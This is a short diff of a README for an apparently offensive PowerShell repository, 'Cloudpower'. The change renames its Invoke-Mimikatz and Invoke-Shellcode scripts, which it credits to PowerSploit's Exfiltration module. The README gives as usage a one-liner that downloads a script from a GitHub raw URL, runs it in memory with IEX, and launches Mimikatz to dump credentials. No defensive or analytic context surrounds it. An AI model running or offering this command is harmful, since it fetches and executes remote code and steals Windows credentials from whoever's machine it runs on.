@@ -1,8 +1,8 @@
 # Cloudpower
 test for interest
-The Invoke-mimi & Invoke-Shellcode is from https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/
+The Invoke-Mimikatz & Invoke-Shellcode is from https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/
 
-# Help for Invoke-mimi:
+# Help for Invoke-Mimikatz:
 powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/aspiggy/Cloudpower/master/Invoke-mimi.ps1'); Invoke-Mimikatz
 
 
